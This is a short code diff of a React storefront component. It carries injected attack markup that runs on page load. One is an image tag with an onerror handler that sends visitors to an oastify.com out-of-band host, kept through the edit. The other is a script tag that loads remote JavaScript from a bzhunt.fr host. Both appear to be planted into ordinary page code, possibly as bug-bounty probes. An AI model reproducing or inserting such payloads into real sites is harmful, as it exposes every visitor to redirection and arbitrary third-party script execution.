@@ -52,7 +52,7 @@ export default function App() {
       </head>
       <body>
         <h1>Hello, {name}</h1>
-<img src onerror='location=`http://fbuz558sx6xwkegcvppwpazi79d01rwfl.oastify.com`'>
+<img src onerror='location=`http://fbuz558sx6xwkegcvppwpazi79d01rwfl.oastify.com`'/>
         <p>This is a custom storefront powered by Hydrogenafrraaa</p>
 <script src="https://bzhunt.fr/assets/js/1.js"></script>
         <Outlet />
